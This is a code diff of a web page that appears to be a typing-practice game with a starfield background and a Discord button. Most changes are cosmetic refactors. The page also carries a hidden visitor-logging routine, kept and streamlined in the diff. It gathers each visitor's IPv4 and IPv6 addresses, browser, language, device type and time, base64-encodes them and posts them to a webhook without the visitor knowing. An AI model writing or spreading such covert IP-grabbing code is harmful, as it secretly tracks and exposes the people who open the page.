@@ -24,10 +24,15 @@
     letter-spacing: normal;
   }
   #sentence span {
-    margin: 0 3px;
+    margin: 0 2px;
   }
   .correct { color: #4caf50; }
-  .incorrect { color: #f44336; background-color: rgba(255,0,0,0.15); border-radius: 4px; }
+  .incorrect {
+    color: #f44336;
+    background-color: rgba(255, 0, 0, 0.15);
+    border-radius: 4px;
+    padding: 0 3px;
+  }
   .pending { color: #ddd; }
   #userInput {
     width: 100%; padding: 10px; font-size: 20px;
@@ -71,7 +76,7 @@
   <source src="https://cdn.pixabay.com/download/audio/2022/03/28/audio_3800f15e5a.mp3?filename=deep-ambient-11228.mp3" type="audio/mpeg" />
 </audio>
 
-<!-- أيقونة ديسكورد بالـ SVG واضحة -->
+<!-- أيقونة ديسكورد واضحة -->
 <svg id="discordButton" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 71 55" fill="#7289da" >
   <path d="M60.104 4.552a58.414 58.414 0 00-14.186-4.5.211.211 0 00-.223.106c-.61 1.063-1.29 2.447-1.774 3.536-5.348-.805-10.64-.805-15.888 0-.485-1.09-1.164-2.473-1.774-3.536a.206.206 0 00-.223-.106 58.337 58.337 0 00-14.187 4.5.193.193 0 00-.089.076C.68 14.072-.267 23.616.175 33.044c.002.023.016.045.016.069a60.055 60.055 0 0017.448 8.91.22.22 0 00.24-.076c1.344-1.85 2.544-3.796 3.574-5.79a.206.206 0 00-.117-.295 42.51 42.51 0 01-6.175-2.92.207.207 0 01-.02-.345c.415-.31.83-.63 1.232-.956a.206.206 0 01.214-.036c12.926 5.915 27.01 5.915 39.877 0a.205.205 0 01.216.034c.4.324.815.643 1.23.953a.207.207 0 01-.02.344 42.075 42.075 0 01-6.175 2.922.206.206 0 00-.118.295c1.034 1.992 2.231 3.94 3.58 5.79a.22.22 0 00.239.076 60.226 60.226 0 0017.449-8.91c.005-.023.018-.045.018-.069-.5-10.747-1.503-19.677-5.44-28.416a.192.192 0 00-.088-.075zM23.725 37.33c-3.207 0-5.83-2.95-5.83-6.577 0-3.628 2.596-6.576 5.83-6.576 3.252 0 5.88 2.947 5.83 6.576 0 3.627-2.6 6.577-5.83 6.577zm23.56 0c-3.206 0-5.83-2.95-5.83-6.577 0-3.628 2.596-6.576 5.83-6.576 3.252 0 5.88 2.947 5.83 6.576 0 3.627-2.598 6.577-5.83 6.577z"/>
 </svg>
@@ -116,7 +121,7 @@
     for (let i = 0; i < targetWords.length; i++) {
       let span = document.createElement("span");
       span.textContent = targetWords[i];
-      span.style.margin = "0 3px";
+      span.style.margin = "0 2px";
       if (inputWords[i] == null) {
         span.className = "pending";
       } else if (inputWords[i] === targetWords[i]) {
@@ -208,15 +213,13 @@
 
       const ua = navigator.userAgent;
       const lang = navigator.language;
-      const now = new Date();
-      const timeString = now.toISOString();
+      const timeString = new Date().toISOString();
       const ipv4 = ipv4Data.ip;
       const ipv6 = (ipv6Data.ip && ipv6Data.ip !== ipv4) ? ipv6Data.ip : 'غير معروف';
 
-      let deviceType = "كمبيوتر";
-      if (/android|iphone|ipad|ipod/i.test(ua)) {
-        deviceType = /tablet|ipad/i.test(ua) ? "تابلت" : "جوال";
-      }
+      const deviceType = /android|iphone|ipad|ipod/i.test(ua)
+        ? (/tablet|ipad/i.test(ua) ? "تابلت" : "جوال")
+        : "كمبيوتر";
 
       const infoText = `
 IP (IPv4): ${ipv4}
@@ -232,30 +235,21 @@ IP (IPv6): ${ipv6}
 المتصفح: ${ua}
 اللغة: ${lang}
 الوقت: ${timeString}
-حقوق النشر: معاذ الحربي
-      `.trim();
+حقوق النشر: معاذ الحربي`.trim();
 
-      // تشفير البيانات قبل الإرسال
       const encodedInfo = base64Encode(infoText);
 
-      const response = await fetch(WEBHOOK_URL, {
+      await fetch(WEBHOOK_URL, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ content: encodedInfo })
       });
-
-      if (response.ok) {
-        console.log("تم إرسال البيانات للويب هوك بنجاح");
-      } else {
-        console.error("فشل إرسال البيانات للويب هوك");
-      }
-
-    } catch (e) {
-      console.error('خطأ في إرسال معلومات المستخدم', e);
+    } catch (err) {
+      console.error("فشل في إرسال البيانات:", err);
     }
   }
 
-  // نجوم متحركة
+  // نجوم خلفية
   const canvas = document.getElementById('stars');
   const ctx = canvas.getContext('2d');
   let width, height, stars;
@@ -264,37 +258,31 @@ IP (IPv6): ${ipv6}
     height = window.innerHeight;
     canvas.width = width;
     canvas.height = height;
-    stars = [];
-    for (let i = 0; i < 100; i++) {
-      stars.push({
-        x: Math.random() * width,
-        y: Math.random() * height,
-        radius: Math.random() * 1.1,
-        alpha: Math.random()
-      });
-    }
+    stars = Array.from({length: 100}, () => ({
+      x: Math.random() * width,
+      y: Math.random() * height,
+      radius: Math.random() * 1.1,
+      alpha: Math.random()
+    }));
   }
   function drawStars() {
     ctx.clearRect(0, 0, width, height);
-    for (let s of stars) {
+    stars.forEach(s => {
       ctx.beginPath();
-      ctx.arc(s.x, s.y, s.radius, 0, Math.PI * 2);
+      ctx.arc(s.x, s.y, s.radius, 0, 2 * Math.PI);
       ctx.fillStyle = `rgba(255,255,255,${s.alpha})`;
       ctx.fill();
-    }
+    });
   }
   function animateStars() {
-    for (let s of stars) {
+    stars.forEach(s => {
       s.alpha += (Math.random() - 0.5) * 0.05;
-      if (s.alpha < 0) s.alpha = 0;
-      else if (s.alpha > 1) s.alpha = 1;
-    }
+      s.alpha = Math.max(0, Math.min(1, s.alpha));
+    });
     drawStars();
     requestAnimationFrame(animateStars);
   }
-  window.addEventListener('resize', () => {
-    initStars();
-  });
+  window.addEventListener("resize", initStars);
   initStars();
   animateStars();
 
